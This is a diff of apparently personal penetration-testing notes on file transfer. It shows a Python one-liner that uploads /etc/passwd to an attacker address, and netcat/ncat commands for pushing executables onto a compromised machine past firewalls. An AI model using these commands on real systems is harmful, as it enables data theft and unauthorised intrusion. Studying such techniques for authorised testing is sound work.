@@ -1404,3 +1404,37 @@ fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = frea
   2. Upload One liner 
     python3 -c 'import requests;requests.post("http://[ip]:[port]/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+
+<br>
+
+### Miscellaneous File Transfer Methods (Netcat, Ncat, RDP)
+```
+# Netcat 
+  A tool that allows you to read and write from network connections using TCP or UDP. Netcat was made in 1995 but never maintained. Ncat was made in its place to support newer security protocols
+
+# File transfer using ncat and netcat 
+  1. On comprimised machine start netcat and have it listen on a port. This command also redirects the standard output to a file. 
+    nc -l -p 8000 > file.exe
+    Use the flag "--recv-only" if using ncat
+
+  2. From the attack machine we can upload a file using netcat. Specify "-q 0" to tell the program to turn off after the file has been uploaded. We pass the file we want to send into standard in 
+    nc -q 0 [ip] [port] < fileToSend.txt
+    Use the flag "--send-only" if using ncat 
+
+
+# Sending to comprimised machine using netcat 
+  1. This technique is useful when the comprimsed machine has a firewall that is blocking inbound connecitons. If we can use an open port, we can push data through it. 
+    sudo nc -l -p [open port ] -q 0 < fileToSend.exe
+
+  2. On the attack machine, accept the input 
+    nc [ip] [port] > nameOfNewFile.exe
+
+
+# Sending to comprimised machine using ncat 
+  sudo ncat -l -p [open port] --send-only < fileToSend.exe 
+
+  ncat [ip] [port] --recv-only > newFileName.exe
+
+
+#
+```
